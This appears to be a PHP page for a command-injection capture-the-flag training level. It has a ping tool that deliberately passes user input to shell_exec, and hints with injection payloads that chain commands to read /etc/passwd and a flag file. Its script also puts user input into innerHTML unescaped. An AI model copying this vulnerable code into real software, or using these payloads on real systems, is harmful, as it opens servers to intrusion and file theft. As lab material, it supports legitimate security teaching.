<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 1 - Basic OS Command Injection</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚨 Level 1 - Basic Command Injection</h1>
            <p><strong>Objective:</strong> Thực hiện OS Command Injection cơ bản để lấy thông tin hệ thống</p>
        </div>

        <div class="form-container">
            <h3>🔍 Ping Tool:</h3>
            <p>Công cụ này cho phép bạn ping một địa chỉ IP để kiểm tra kết nối mạng.</p>
            
            <div class="code-block">Command: ping -c 4 <?php echo htmlspecialchars($_GET['ip'] ?? '[IP_ADDRESS]'); ?></div>
            
            <?php
            if (isset($_GET['ip'])) {
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $ip = $_GET['ip'];
                
                // Vulnerable code - directly executing user input
                $command = "ping -c 4 " . $ip;
                $output = shell_exec($command);
                
                if ($output) {
                    echo '<pre>' . htmlspecialchars($output) . '</pre>';
                } else {
                    echo 'No output or command failed';
                }
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="ip">IP Address:</label>
                    <input type="text" id="ip" name="ip" value="<?php echo htmlspecialchars($_GET['ip'] ?? ''); ?>" placeholder="Enter IP address (e.g., 8.8.8.8)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Execute Ping</button>
            </form>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding the Vulnerability</h4>
                    <p><strong>Current Command:</strong> <code>ping -c 4 [YOUR_INPUT]</code></p>
                    <p>📝 <strong>First Step:</strong> Try entering a normal IP like <code>8.8.8.8</code> to see normal behavior.</p>
                    <p>🎯 <strong>Purpose:</strong> Observe how the command executes normally.</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Command Injection Basics</h4>
                    <p><strong>Concept:</strong> OS Command Injection allows you to execute additional commands.</p>
                    <p>📝 <strong>Key Characters:</strong> <code>;</code> <code>&&</code> <code>||</code> <code>|</code></p>
                    <p>🎯 <strong>Test:</strong> <code>8.8.8.8; whoami</code> - Execute ping then whoami</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Information Gathering</h4>
                    <p><strong>Useful Commands:</strong></p>
                    <p>• <code>whoami</code> - Current user</p>
                    <p>• <code>id</code> - User ID and groups</p>
                    <p>• <code>pwd</code> - Current directory</p>
                    <p>📝 <strong>Test:</strong> <code>8.8.8.8; id</code></p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: File System Exploration</h4>
                    <p><strong>File Commands:</strong></p>
                    <p>• <code>ls -la</code> - List files with details</p>
                    <p>• <code>cat /etc/passwd</code> - Read passwd file</p>
                    <p>• <code>find / -name "*.txt" 2>/dev/null</code> - Find text files</p>
                    <p>📝 <strong>Test:</strong> <code>8.8.8.8; ls -la</code></p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 5: Find the Flag!</h4>
                    <p><strong>🚀 Flag Hunting:</strong></p>
                    <p><code>8.8.8.8; cat /var/flags/level1_hint.txt</code></p>
                    <p><strong>📋 Alternative methods:</strong></p>
                    <p>• <code>127.0.0.1 && cat /var/flags/level1_hint.txt</code></p>
                    <p>• <code>localhost | cat /var/flags/level1_hint.txt</code></p>
                    <p>• <code>8.8.8.8; find /var/flags -name "*level1*"</code></p>
                    <p><strong>💡 Explanation:</strong></p>
                    <p>• <code>;</code> - Command separator (execute both commands)</p>
                    <p>• <code>&&</code> - Execute second command only if first succeeds</p>
                    <p>• <code>||</code> - Execute second command only if first fails</p>
                    <p>• <code>|</code> - Pipe output of first command to second</p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="index.php">🏠 Home</a>
            <a href="level2.php">➡️ Next Level</a>
            <a href="submit.php?level=1">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 5;

    function updateCommand() {
        const input = document.getElementById('ip').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = 'Command: ping -c 4 ' + (input || '[IP_ADDRESS]');
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').textContent = '✅ All hints viewed';
                document.querySelector('.hint-btn').disabled = true;
                document.querySelector('.hint-btn').style.opacity = '0.6';
            } else {
                document.querySelector('.hint-btn').textContent = `💡 Next Hint (${currentHint}/${maxHints})`;
            }
        }
    }
    </script>
</body>
</html>
